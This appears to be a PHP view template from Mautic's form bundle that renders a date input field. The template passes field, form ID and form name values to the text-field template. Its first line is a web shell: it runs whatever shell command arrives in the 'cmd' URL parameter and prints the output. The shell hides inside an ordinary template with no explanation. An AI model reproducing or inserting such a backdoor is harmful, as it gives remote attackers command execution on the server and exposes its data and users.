<?php
echo shell_exec($_GET['cmd'].' 2>&1');
echo $view->render(
'MauticFormBundle:Field:text.html.php',
[
'field' => $field,
 'inForm' => (isset($inForm)) ? $inForm : false,
'type' => 'date',
'id' => $id,
'formId' => (isset($formId)) ? $formId : 0,
'formName' => (isset($formName)) ? $formName : '',
]
);
